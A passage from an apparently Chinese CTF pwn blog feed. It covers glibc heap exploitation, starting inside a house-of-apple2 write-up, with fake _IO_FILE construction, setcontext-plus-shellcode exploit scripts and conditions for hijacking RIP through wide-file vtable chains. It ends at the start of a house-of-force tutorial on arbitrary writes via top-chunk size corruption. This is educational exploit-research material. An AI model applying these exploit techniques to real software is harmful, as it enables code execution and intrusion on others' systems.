class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)            <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)       <span class="comment">#setcontext-&gt;rsp</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)     <span class="comment">#setcontext-&gt;rcx</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps)  <span class="comment"># vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x100</span>-<span class="number">0x68</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>) + shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;74r0t#C@rd&quot;</span></span><br><span class="line">out()</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.sendline(fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment"># p.sendline(b&quot;2&quot;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h5 id="2-IO-wfile-underflow-mmap链"><a href="#2-IO-wfile-underflow-mmap链" class="headerlink" title="2._IO_wfile_underflow_mmap链"></a>2._IO_wfile_underflow_mmap链</h5><p>源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">		      fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">		      &amp;read_stop,</span><br><span class="line">		      fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">		      fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">		      &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_read_ptr = (<span class="type">char</span> *) read_stop;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we managed to generate some text return the next character.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There is some garbage at the end of the file.  */</span></span><br><span class="line">  __set_errno (EILSEQ);</span><br><span class="line">  fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">  <span class="keyword">return</span> WEOF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mmap_remap_check (fp)))</span><br><span class="line">    <span class="comment">/* We punted to the regular file functions.  */</span></span><br><span class="line">    <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">  <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>需满足的条件如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_flags &amp; _IO_NO_READS == <span class="number">0</span>;</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end == <span class="literal">false</span>;</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_save_base == <span class="literal">NULL</span>;	<span class="comment">//也可以不为null，但要执行一次free和flag的设置，最好设置为0</span></span><br></pre></td></tr></table></figure></div>

<p>实质上就是进入的点不同，最后利用的链还是相同的。这里如果只是单纯的把虚表从<code>_IO_wfile_jumps</code>改成<code>_IO_wfile_jumps_mmap</code>，实际最后还是会进入overflow那个函数。因为这两个虚表其实是完全相同的，而我们触发的是原来表中overflow那个虚表函数。我们需要添加偏移来进入不同的函数，在本题中，经测试+0x10的偏移能够进入<code>_IO_wdefault_uflow</code>，偏移+0x30能进入<code>_IO_wfile_seekoff</code>，+8偏移能成功进入<code>_IO_wfile_underflow_mmap</code>，其实就是对应原表的偏移。</p>
<p>构造如下</p>
<ul>
<li><code>_flags</code> &#x3D; <code>~4</code></li>
<li><code>vtable</code> 设置为 <code>_IO_wfile_jumps_mmap</code> 地址（加减偏移）</li>
<li><code>_IO_read_end &gt; _IO_read_ptr</code>（不进入调用）</li>
<li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>（即满足<code>*A&gt;=*(A+8)</code>）</li>
<li><code>_wide_data-&gt;_IO_buf_base</code> &#x3D; <code>0</code>（即满足<code>*(A+0x30)=0</code>）</li>
<li><code>_wide_data-&gt;_IO_save_base</code> &#x3D; <code>0</code>（即满足<code>*(A+0x40)=0</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> &#x3D; 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> &#x3D; 地址<code>C</code>，用于劫持 <code>RIP</code>（即满足<code>*(B+0x68)=C</code>）</li>
</ul>
<p>但这里rdx进去不是可控地址，看上去是把我们处在第二个字段<code>_IO_read_ptr</code>的largebin chunk size给赋值过来了。这就为setcontext赋值增加了难度，所以这一题不用这个方法。我们能成功的到这一步其实已经算是成功的利用了这条链条。可以尝试call到别的地方打。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241110011234406.png"
                      class=""
                >

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fake_IO_FILE  = p64(<span class="number">0x1000</span>)   #read_end</span><br><span class="line">fake_IO_FILE += p64(<span class="number">3</span>)          #read_base</span><br><span class="line">fake_IO_FILE += p64(<span class="number">20</span>) + p64(<span class="number">22</span>) #_write_base,_write_ptr</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)+p64(<span class="number">0</span>) #_IO_buf_base,_IO_buf_end </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      #_IO_save_base</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      #_IO_backup_base</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      #_IO_save_end</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)       #_lock</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x18</span>)    #_wide_data</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)            # _mode = <span class="number">0</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)       <span class="meta">#setcontext-&gt;rsp</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)     <span class="meta">#setcontext-&gt;rcx</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps_mmap+<span class="number">0x8</span>)  <span class="meta"># vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xf8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x100</span><span class="number">-0x68</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x100</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>) + shellcode</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h5 id="3-IO-wdefault-xsgetn链"><a href="#3-IO-wdefault-xsgetn链" class="headerlink" title="3. _IO_wdefault_xsgetn链"></a>3. _IO_wdefault_xsgetn链</h5><p>源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_in_put_mode(_fp) ((_fp)-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">	      fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">	    count = <span class="number">0</span>;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">	      <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">	      <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">		*s++ = *p++;</span><br><span class="line">	      fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">            more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">wint_t</span></span><br><span class="line">__wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_wget_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_wbackup (fp, fp-&gt;_wide_data-&gt;_IO_read_end))</span><br><span class="line">	<span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_wbackup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">	fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>目的是进到<code>__wunderflow (fp)</code>中<code>_IO_switch_to_wget_mode</code>里的<code>(wint_t)_IO_WOVERFLOW (fp, WEOF)</code>这个虚表函数调用。</p>
<p>需要满足条件如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_wide_data-&gt;_IO_read_end == fp-&gt;_wide_data-&gt;_IO_read_ptr;	<span class="comment">//可以绕过前面一些麻烦的操作，直奔__wunderflow</span></span><br><span class="line">(fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>)) == <span class="literal">false</span>;	<span class="comment">//mode设置为1即可</span></span><br><span class="line">_IO_in_put_mode (fp)!=<span class="number">0</span>;	<span class="comment">//即fp-&gt;flags &amp; 0x800 != 0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base;</span><br></pre></td></tr></table></figure></div>

<p>构造如下</p>
<ul>
<li><code>_flags</code> &#x3D; <code>0x800</code></li>
<li><code>vtable</code> &#x3D; <code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code> 地址（加减偏移）</li>
<li><code>_mode</code> &gt; <code>0</code>（即满足<code>*(fp+0xc0)&gt;0</code>）</li>
<li><code>_wide_data</code> &#x3D; 可控堆地址<code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code> （即满足 <code>*(A+8)=*A</code>）</li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>（即满足<code>*(A+0x20)&gt;*(A+0x18)</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> &#x3D; 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code> &#x3D; 地址<code>C</code>，用于劫持<code>RIP</code>（即满足<code>*(B+0x18)=C</code>）</li>
</ul>
<p>很可惜的是futureheap这道题只能申请0x700大小以下的堆块，而用largebin attack改的_IO_list_all后，第一个<code>_IO_FILE</code>结构体的<code>_flags</code>字段实质上就被赋值为largebin chunk的大小。我们就无法使<code>_IO_in_put_mode (fp)!=0</code>这个条件成立，所以本题也不好使用这一条链条。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>在示例题目中，上面3种方法只有第一种方式比较方便题解，这说明了几个链条的适用条件都有所不同，可以根据具体情况选择不同的链条进行尝试。本质还是<code>_IO_flush_all_lockp</code>这个FSOP的利用。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>house of</tag>
      </tags>
  </entry>
  <entry>
    <title>house_of_force</title>
    <url>/blog/2024/10/03/house-of-force/</url>
    <content><![CDATA[<h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><p>glibc2.23 - 2.29</p>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>能控制top chunk的size域</li>
<li>能获取heap_base，进而计算出top_chunk的地址</li>
<li>能自由控制堆分配尺寸大小</li>
</ul>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ul>
<li><p>将top chunk的size改得很大，使后续能够分配很大的堆块，从而使topchunk指向目标地址。</p>
</li>
<li><p>精准计算top chunk的地址与target addr-0x10之间偏移，再进行细微的调整，使申请完一个chunk后，top chunk的data域直接位于target addr处。</p>
</li>
<li><p>再申请一个chunk，往目标地址处写入值。</p>
</li>
</ul>
<h4 id="实现目的"><a href="#实现目的" class="headerlink" title="实现目的"></a>实现目的</h4><p>任意地址写</p>
<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>2.27glibc top chunk分配源代码如下</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = <span class="built_in">chunksize</span> (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">  remainder_size = size - nb;			<span class="comment">//分配后剩下的大小</span></span><br><span class="line">  remainder = <span class="built_in">chunk_at_offset</span> (victim, nb);		<span class="comment">//剩下的chunk</span></span><br><span class="line">  av-&gt;top = remainder;							<span class="comment">//更新top chunk</span></span><br><span class="line">  <span class="built_in">set_head</span> (victim, nb | PREV_INUSE |			<span class="comment">//设置从原topchunk分配出的chunk的头部</span></span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">  <span class="built_in">set_head</span> (remainder, remainder_size | PREV_INUSE);	<span class="comment">//设置新的top chunk的头部</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_malloced_chunk</span> (av, victim, nb);</span><br><span class="line">  <span class="type">void</span> *p = <span class="built_in">chunk2mem</span> (victim);</span><br><span class="line">  <span class="built_in">alloc_perturb</span> (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中nb定义在<code>checked_request2size (bytes, nb);</code>,这个宏内部定义了nb的值（也就是sz）。<code>_int_malloc (mstate av, size_t bytes)</code>，bytes是该函数的参数，也就是我们调用malloc函数时传进去的数字。<code>nb</code> 实质上是用来存储经过调整后的内存请求大小的变量。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (req) &gt;=						      \</span></span><br><span class="line"><span class="meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Same, except also perform an argument and result check.  First, we check</span></span><br><span class="line"><span class="comment">   that the padding done by request2size didn&#x27;t result in an integer</span></span><br><span class="line"><span class="comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span></span><br><span class="line"><span class="comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span></span><br><span class="line"><span class="comment">   overflow.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz) \</span></span><br><span class="line"><span class="meta">(&#123;				    \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);	    \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((sz) &lt; (req))		    \			<span class="comment">//调整后的sz一定要比传入的bytes要大</span></span></span><br><span class="line">      || <span class="built_in">REQUEST_OUT_OF_RANGE</span> (sz)) \		<span class="comment">//一般都会满足，申请的大小不要太大就行</span></span><br><span class="line">    &#123;				    \</span><br><span class="line">      __set_errno (ENOMEM);	    \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;			    \</span><br><span class="line">    &#125;				    \</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>

<p>这里我们如果申请一个大小为负数的chunk，实际上nb经request2size处理后是一个非常大的正数，但加上一定值后溢出，也就实现了正常的正数与负数的运算。我们的topchunk实际上会向低地址处偏移。需要注意的是，申请一个大小为负数的chunk时，这个负数会被unsigned int转换成一个非常大的数。这时如果我们这个转换后的数的大小大于我们修改的top chunk的size，<code>malloc</code> 将尝试扩展堆空间，这时候就会调用 <code>sysmalloc</code>，其中就会报错退出。所我们一般直接把top chunk的size改成-1，也就是0xffffffffffffffff。基本就可以通过所有检测。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/03/house-of-force/image-20241003002907725.png"
                      class=""
                >

<p>由于我们要精准控制申请后的大小来使top chunk落在想要的位置，也就是要控制request2size(req)的值</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT_MASK (MALLOC_ALIGNMENT - 1)	<span class="comment">//32位系统上通常为0x7,64位上为0xf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_SZ (sizeof(size_t))		<span class="comment">//32位系统上通常为4,64位上为8</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))	<span class="comment">//0x20</span></span></span><br><span class="line"></span><br><span class="line">(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure></div>

<p>由于<code>(req) + SIZE_SZ + MALLOC_ALIGN_MASK</code>一般都会大于MINSIZE，所以我们就要使我们输入req为<code>target_offset - SIZE_SZ - MALLOC_ALIGN_MASK</code>，这样我们只要target_add是关于16字节对齐的，那么最后申请出chunk就会使top_chunk偏移到我们想要的地址处。</p>
<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="hitcontraning-lab11"><a href="#hitcontraning-lab11" class="headerlink" title="hitcontraning_lab11"></a>hitcontraning_lab11</h5><img  
                     lazyload
                     src="/images/loading.svg"
